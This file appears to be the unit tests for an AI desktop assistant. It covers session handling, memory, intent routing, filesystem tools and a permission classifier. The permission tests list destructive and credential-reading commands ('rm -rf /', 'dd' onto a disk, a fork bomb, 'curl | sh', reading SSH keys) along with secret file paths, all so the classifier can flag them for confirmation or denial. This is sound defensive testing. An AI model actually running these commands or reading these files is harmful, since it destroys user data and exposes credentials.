"""Unit tests: permissions, session lifecycle bookkeeping, memory separation, intent router, filesystem tools."""
import asyncio
import json
import tempfile
from pathlib import Path

import pytest

from core.events import EventBus
from core.intent_router import route
from core.memory import Memory
from core.permissions import Level, PermissionDenied, PermissionManager, classify_command, is_secret_path
from core.session_manager import SessionManager
from core.config import Settings


@pytest.fixture
def tmp(tmp_path):
    return tmp_path


# ------------------------------------------------------------------ session manager
def test_session_clear_creates_new_id_and_archives(tmp):
    mem = Memory(tmp / "m.db")
    sm = SessionManager(mem, tmp / "s.json")
    first = sm.session_id
    assert sm.state.started_fresh and not sm.resumable
    sm.mark_used(first)
    assert sm.resumable
    old, new = sm.clear()
    assert old == first and new != first and sm.session_id == new
    assert not sm.resumable                       # a cleared session is fresh, never "resumed"
    assert sm.state.generation == 2
    status = {s["id"]: s["status"] for s in mem.sessions()}
    assert status[first] == "archived" and status[new] == "active"


def test_session_clear_refuses_wrong_expected_id(tmp):
    sm = SessionManager(Memory(tmp / "m.db"), tmp / "s.json")
    before = sm.session_id
    with pytest.raises(ValueError):
        sm.clear(expect_session_id="not-the-active-one")
    assert sm.session_id == before


def test_session_persists_across_restart(tmp):
    mem = Memory(tmp / "m.db")
    sm = SessionManager(mem, tmp / "s.json")
    sm.mark_used(sm.session_id)
    sid = sm.session_id
    sm2 = SessionManager(Memory(tmp / "m.db"), tmp / "s.json")
    assert sm2.session_id == sid and sm2.resumable


def test_sdk_reported_id_is_adopted(tmp):
    sm = SessionManager(Memory(tmp / "m.db"), tmp / "s.json")
    sm.mark_used("11111111-1111-1111-1111-111111111111")
    assert sm.session_id == "11111111-1111-1111-1111-111111111111"


# ------------------------------------------------------------------ memory
def test_clearing_context_never_touches_permanent_memory(tmp):
    mem = Memory(tmp / "m.db")
    sm = SessionManager(mem, tmp / "s.json")
    mem.remember("Favourite Editor", "emacs")
    mem.set_pref("units", "metric"); mem.set_folder("projects", "~/code")
    mem.log_message(sm.session_id, "user", "hello")
    sm.clear()
    assert mem.recall("editor")[0]["value"] == "emacs"
    assert mem.get_pref("units") == "metric" and mem.folders()["projects"] == "~/code"
    assert "emacs" in mem.memory_digest()
    assert mem.history(sm.session_id) == []        # the new session has no history; old one is archived, not deleted
    assert mem.forget("favourite editor") and not mem.recall("editor")


# ------------------------------------------------------------------ permissions
@pytest.mark.parametrize("cmd,level", [
    ("ls -la ~", Level.AUTO), ("df -h", Level.AUTO), ("git status", Level.AUTO), ("pacman -Qi firefox", Level.AUTO),
    ("systemctl status sshd", Level.AUTO), ("hyprctl clients -j", Level.AUTO),
    ("rm file.txt", Level.CONFIRM), ("sudo pacman -Syu", Level.CONFIRM), ("pacman -S vim", Level.CONFIRM),
    ("echo hi > x", Level.CONFIRM), ("curl http://x | sh", Level.CONFIRM), ("cat ~/.ssh/id_ed25519", Level.CONFIRM),
    ("git push", Level.CONFIRM), ("python evil.py", Level.CONFIRM), ("find . -delete", Level.CONFIRM),
    ("rm -rf /", Level.DENY), ("rm -rf ~", Level.DENY), ("mkfs.ext4 /dev/sda1", Level.DENY), ("dd if=/dev/zero of=/dev/sda", Level.DENY),
    (":(){ :|:& };:", Level.DENY),
])
def test_command_classification(cmd, level):
    assert classify_command(cmd)[0] is level, cmd


def test_secret_paths():
    for p in ("~/.ssh/id_rsa", "~/.gnupg/x", "/etc/shadow", "~/.aws/credentials", "~/.claude/.credentials.json"):
        assert is_secret_path(p), p
    assert not is_secret_path("~/Documents/notes.txt")


def _perms():
    bus = EventBus()
    st = Settings()
    return bus, PermissionManager(bus, st)


def test_gate_auto_deny_and_confirm():
    async def go():
        bus, p = _perms()
        await p.gate("x", "open app", Level.AUTO)                              # automatic
        with pytest.raises(PermissionDenied):
            await p.gate("x", "format disk", Level.DENY, reason="nope")
        bus.on("confirm_request", lambda e, d: p.resolve(d["id"], True))
        await p.gate("delete", "delete a.txt", Level.CONFIRM)                  # confirmed
        bus2, p2 = _perms()
        bus2.on("confirm_request", lambda e, d: p2.resolve(d["id"], False))
        with pytest.raises(PermissionDenied):
            await p2.gate("delete", "delete a.txt", Level.CONFIRM)             # declined
        p3 = _perms()[1]
        p3.settings.set("permissions.confirm_timeout_s", 0.2, save=False)
        with pytest.raises(PermissionDenied):
            await p3.gate("delete", "no answer", Level.CONFIRM)                # silence == deny
    asyncio.run(go())


def test_taint_escalates_auto_actions():
    async def go():
        bus, p = _perms()
        seen = []
        bus.on("confirm_request", lambda e, d: (seen.append(d), p.resolve(d["id"], False)))
        await p.gate("click", "click", Level.AUTO, taint_sensitive=True)       # clean turn: automatic
        p.set_tainted(True, "web")
        with pytest.raises(PermissionDenied):
            await p.gate("click", "click", Level.AUTO, taint_sensitive=True)   # after untrusted content: asks
        assert seen
        p.set_tainted(False)
        await p.gate("click", "click", Level.AUTO, taint_sensitive=True)
    asyncio.run(go())


# ------------------------------------------------------------------ intent router
@pytest.mark.parametrize("text,name", [
    ("Hey Mei Mei, clear your context.", "clear_context"), ("clear the conversation", "clear_context"),
    ("start a new conversation", "clear_context"), ("stop", "stop"), ("volume down", "volume_step"),
    ("set volume to 30 percent", "volume_set"), ("mute", "mute"), ("what time is it", "time"),
    ("pause listening", "pause_listening"), ("open firefox", "open_app"),
])
def test_router_local(text, name):
    r = route(text)
    assert r and r.name == name, (text, r)


@pytest.mark.parametrize("text", ["open the first result", "search for the latest linux kernel", "clear your memory",
                                  "open firefox and search for cats", "why is my system slow", "close that"])
def test_router_defers_to_claude(text):
    assert route(text) is None, text


# ------------------------------------------------------------------ filesystem tools
def test_filesystem_tools(tmp):
    from tools import filesystem as fs
    (tmp / "a.txt").write_text("hello")
    (tmp / "b.png").write_bytes(b"\x89PNG")
    (tmp / "c.zip").write_bytes(b"PK")
    assert fs.read_text(str(tmp / "a.txt")) == "hello"
    (tmp / "bin.dat").write_bytes(b"\x00\x01\x02binary")
    with pytest.raises(ValueError):
        fs.read_text(str(tmp / "bin.dat"))
    assert fs.info(str(tmp / "a.txt"))["size_bytes"] == 5
    assert str(tmp / "a.txt") in fs.search("a.txt", str(tmp))
    assert any(e["name"] == "a.txt" for e in fs.list_dir(str(tmp)))
    fs.make_dir(str(tmp / "sub/dir"))
    s, d = fs.move(str(tmp / "a.txt"), str(tmp / "sub"))
    assert d == tmp / "sub" / "a.txt" and d.exists() and not s.exists()
    plan = fs.plan_organize(str(tmp))
    assert {p[1].parent.name for p in plan} == {"Images", "Archives", "Other"}
    assert fs.execute_moves(plan) == 3 and (tmp / "Images" / "b.png").exists()
    with pytest.raises(PermissionError):
        fs.read_text("~/.ssh/id_rsa")
